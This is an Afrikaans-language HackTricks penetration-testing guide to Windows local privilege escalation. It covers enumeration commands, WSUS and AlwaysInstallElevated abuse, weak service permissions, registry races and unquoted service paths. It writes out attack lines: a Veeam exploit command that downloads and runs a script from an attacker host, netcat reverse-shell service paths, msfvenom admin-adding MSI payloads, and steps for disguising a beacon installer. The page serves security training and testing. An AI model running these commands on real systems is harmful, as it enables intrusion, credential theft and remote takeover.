# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste instrument om te soek vir Windows plaaslike privilege escalation-vektore:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Eerste Windows Teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy verder gaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy die volgende bladsy lees voordat jy verder gaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Daar is verskillende dinge in Windows wat jou kan **verhoed om die system te enumereer**, executables uit te voer of selfs **jou aktiwiteite op te spoor**. Jy moet **lees** die volgende **bladsy** en al hierdie **defense**-**meganismes** **enumereer** voordat jy die privilege escalation-enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes wat deur `RAiLaunchAdminProcess` geloods word, kan misbruik word om High IL te bereik sonder prompts wanneer AppInfo secure-path checks omseil word. Kyk hier na die toegewyde UIAccess/Admin Protection bypass workflow:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kan misbruik word vir 'n arbitrêre SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows builds het ook 'n **SMB arbitrary-port** LPE-pad bekendgestel waar 'n bevoorregte plaaslike NTLM authentication weerkaats word oor 'n hergebruikte SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Kyk of die Windows version enige bekende vulnerability het (kyk ook na die patches wat toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede te soek. Hierdie databasis het meer as 4,700 sekuriteitskwesbaarhede, wat die **massive attack surface** toon wat ’n Windows-omgewing bied.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Enige credential/Juicy-inligting gestoor in die omgewingsveranderlikes?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Jy kan leer hoe om dit aan te skakel in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details van PowerShell-pyplyn-uitvoerings word opgeneem, wat uitgevoerde opdragte, opdraginvokasies, en dele van scripts insluit. Volledige uitvoeringsbesonderhede en uitvoerresultate mag egter nie vasgelê word nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** eerder as **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeure uit PowersShell logs te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

’n Volledige aktiwiteit en volle inhoudrekord van die script se uitvoering word vasgelê, wat verseker dat elke blok kode gedokumenteer word soos dit loop. Hierdie proses behou ’n omvattende ouditspoor van elke aktiwiteit, waardevol vir forensika en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit op die tydstip van uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging-gebeurtenisse vir die Script Block kan in die Windows Event Viewer by die pad gevind word: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeurtenisse te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-instellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie versoek word met http**S** nie maar met http.

Jy begin deur te kyk of die netwerk ’n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd te laat loop:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy ’n antwoord kry soos een van hierdie:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan, **is dit exploiteerbaar.** As die laaste registry gelyk is aan 0, dan sal die WSUS-invoer geïgnoreer word.

Om hierdie vulnerabilities te exploit, kan jy tools soos gebruik: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Dit is MiTM gewapende exploit scripts om 'fake' updates in nie-SSL WSUS traffic in te spuit.

Lees die navorsing hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige report hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is dit die flaw wat hierdie bug exploit:

> As ons die mag het om ons local user proxy te modify, en Windows Updates gebruik die proxy wat in Internet Explorer se settings gekonfigureer is, het ons dus die mag om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te run om ons eie traffic te intercept en code as 'n elevated user op ons asset te run.
>
> Verder, aangesien die WSUS service die current user se settings gebruik, sal dit ook sy certificate store gebruik. As ons 'n self-signed certificate vir die WSUS hostname genereer en hierdie certificate by die current user se certificate store voeg, sal ons beide HTTP en HTTPS WSUS traffic kan intercept. WSUS gebruik geen HSTS-agtige mechanisms om 'n trust-on-first-use tipe validation op die certificate te implementeer nie. As die certificate wat aangebied word deur die user trusted is en die korrekte hostname het, sal dit deur die service aanvaar word.

Jy kan hierdie vulnerability exploit met die tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (eens dit liberated is).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Baie enterprise agents stel 'n localhost IPC surface en 'n privileged update channel bloot. As enrollment na 'n attacker server gedwing kan word en die updater 'n rogue root CA of swak signer checks vertrou, kan 'n local user 'n malicious MSI lewer wat die SYSTEM service installeer. Sien 'n generalized technique (gebaseer op die Netskope stAgentSvc chain – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stel 'n localhost service op **TCP/9401** bloot wat attacker-controlled messages verwerk, wat arbitrary commands as **NT AUTHORITY\SYSTEM** toelaat.

- **Recon**: bevestig die listener en version, bv. `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: plaas 'n PoC soos `VeeamHax.exe` met die vereiste Veeam DLLs in dieselfde directory, en trigger dan 'n SYSTEM payload oor die local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Die diens voer die opdrag as SYSTEM uit.
## KrbRelayUp

’n **local privilege escalation** kwesbaarheid bestaan in Windows **domain** omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP signing** nie afgedwing word nie, gebruikers self-regte het wat hulle in staat stel om **Resource-Based Constrained Delegation (RBCD)** te konfigureer, en die vermoë vir gebruikers om rekenaars binne die domain te skep. Dit is belangrik om daarop te let dat hierdie **requirements** met **default settings** nagekom word.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die vloei van die aanval kyk [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **enabled** is (waarde is **0x1**), dan kan gebruikers van enige privilege `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **install** (execute).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van power-up om binne die huidige gids ’n Windows MSI-binêre lêer te skep om voorregte te eskaleer. Hierdie skrip skryf ’n vooraf-gekombineerde MSI-installeerder uit wat vra vir ’n user/group-byvoeging (so jy sal GIU-toegang nodig hê):
```
Write-UserAddMSI
```
Voer eenvoudig die geskepte binêre uit om voorregte te verhoog.

### MSI Wrapper

Lees hierdie tutoriaal om te leer hoe om ’n MSI-wrapper met hierdie gereedskap te skep. Let daarop dat jy ’n "**.bat**"-lêer kan wrap as jy **net** **command lines** wil **uitvoer**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** met Cobalt Strike of Metasploit ’n **nuwe Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard**-projek en klik **Next**.
- Gee die projek ’n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om op **Next** te klik totdat jy by stap 3 van 4 kom (choose files to include). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc**-projek in die **Solution Explorer** en verander in die **Properties** **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer** wat die geïnstalleerde app meer legitiem kan laat lyk.
- Regskliek die projek en kies **View > Custom Actions**.
- Regskliek **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit sal verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, **build it**.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` gewys word, maak seker dat jy die platform op x64 stel.

### MSI Installation

Om die **installation** van die kwaadwillige `.msi`-lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid uit te buit, kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Hierdie settings bepaal wat **logged** word, so jy moet aandag gee
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, en verseker dat elke wagwoord **uniek, ewekansig, en gereeld bygewerk** is op rekenaars wat by 'n domain aangesluit is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs verkry word deur users aan wie voldoende permissions deur ACLs toegeken is, wat hulle toelaat om plaaslike admin-wagwoorde te sien indien gemagtig.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien aktief, word **plain-text passwords in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer info oor WDigest op hierdie page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Begin met **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onbetroubare prosesse te **blokkeer** om sy geheue te **lees** of kode in te spuit, en sodoende die stelsel verder te beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is ingestel in **Windows 10**. Die doel daarvan is om die geloofsbriewe wat op 'n toestel gestoor is, te beskerm teen bedreigings soos pass-the-hash attacks.| [**Meer inligting oor Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekaste Geloofsbriewe

**Domeingeloofsbriewe** word deur die **Local Security Authority** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde sekuriteitspakket geverifieer word, word domeingeloofsbriewe vir die gebruiker tipies gevestig.\
[**Meer inligting oor Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Tel Gebruikers & Groepe op

Jy behoort te kyk of enige van die groepe waaraan jy behoort interessante permissies het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy aan 'n paar bevoorregte groep behoort, kan jy moontlik voorregte verhoog. Lees meer oor bevoorregte groepe en hoe om hulle te misbruik om voorregte te verhoog hier:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Lees meer** oor wat 'n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende bladsy om **meer te leer oor interessante tokens** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuisvouers
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die clipboard
```bash
powershell -command "Get-Clipboard"
```
## Lopende prosesse

### Lêer- en vouerregte

Eerstens, wanneer jy die prosesse lys, **soek vir wagwoorde binne die command line van die proses**.\
Kyk of jy **een of ander lopende binary kan oorskryf** of of jy skryftoestemming het op die binary se vouer om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) te benut:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om privileges te verhoog](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer permissions van die process binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer toestemmings van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Geheuewagwoord mining

Jy kan ’n geheue-dump van ’n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP het die **credentials in clear text in memory**, probeer die geheue dump en lees die credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop, kan ’n gebruiker toelaat om ’n CMD te open, of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows toe om ’n diens te begin wanneer sekere toestande voorkom (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, ens.). Selfs sonder SERVICE_START-regte kan jy dikwels geprivilegieerde dienste begin deur hul triggers te aktiveer. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry ’n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting oor ’n service te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste privilege level vir elke service te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kyk of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer service

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit aktiveer deur gebruik te maak van
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost afhang van SSDPSRV om te werk (vir XP SP1)**

**Nog 'n workaround** van hierdie probleem is om te hardloop:
```
sc.exe config usosvc start= auto
```
### **Wysig diens-binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens besit, is dit moontlik om die diens se uitvoerbare binêre te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Regte kan geëskaleer word deur verskeie toestemmings:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die diens-binaire toe.
- **WRITE_DAC**: Maak toestemming-herkonfigurasie moontlik, wat lei tot die vermoë om dienskonfigurasies te verander.
- **WRITE_OWNER**: Laat eienaarskapverkryging en toestemming-herkonfigurasie toe.
- **GENERIC_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid, kan die _exploit/windows/local/service_permissions_ gebruik word.

### Services binaries weak permissions

**Kontroleer of jy die binaire wat deur 'n diens uitgevoer word kan wysig** of as jy **skryftoestemmings op die vouer** het waar die binaire geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binaire wat deur 'n diens uitgevoer word met **wmic** (nie in system32 nie) verkry en jou toestemmings met **icacls** nagaan:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienste-register verander toestemmings

Jy should check if you can modify any service registry.\
Jy kan jou **toestemmings** oor 'n diens **register** **check** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dit moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binary wat deur die service uitgevoer word, verander word.

Om die Path van die uitgevoerde binary te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Sommige Windows Accessibility-kenmerke skep per-gebruiker **ATConfig**-keys wat later deur ’n **SYSTEM**-proses in ’n HKLM-sessiesleutel gekopieer word. ’n Registry **symbolic link race** kan daardie bevoorregte skryfoperasie herlei na **enige HKLM-pad**, wat ’n arbitrêre HKLM **value write**-primitive gee.

Sleutel-liggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys geïnstalleerde accessibility-kenmerke.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor gebruiker-beheerde konfigurasie.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens logon/secure-desktop-oorgange geskep en is deur die gebruiker skryfbaar.

Misbruikvloei (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-waarde wat jy wil hê deur SYSTEM geskryf moet word.
2. Trigger die secure-desktop copy (bv. **LockWorkstation**), wat die AT broker flow begin.
3. **Wen die race** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock aktiveer, vervang die **HKLM Session ATConfig**-key met ’n **registry link** na ’n beskermde HKLM-teiken.
4. SYSTEM skryf die aanvaller-gekose waarde na die herlei HKLM-pad.

Sodra jy arbitrêre HKLM value write het, pivot na LPE deur diens-konfigurasiewaardes te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies ’n diens wat ’n normale gebruiker kan begin (bv. **`msiserver`**) en trigger dit nadat die skryf plaasgevind het. **Nota:** die publieke exploit-implementasie **lock the workstation** as deel van die race.

Voorbeeld-tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

As jy hierdie toestemming oor ’n register het, beteken dit dat **jy subregisters van hierdie een kan skep**. In die geval van Windows services is dit **genoeg om arbitrêre kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die pad na ’n uitvoerbare lêer nie tussen aanhalingstekens is nie, sal Windows probeer om elke einde voor ’n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle unquoted service paths, uitgesluit dié wat aan ingeboude Windows services behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
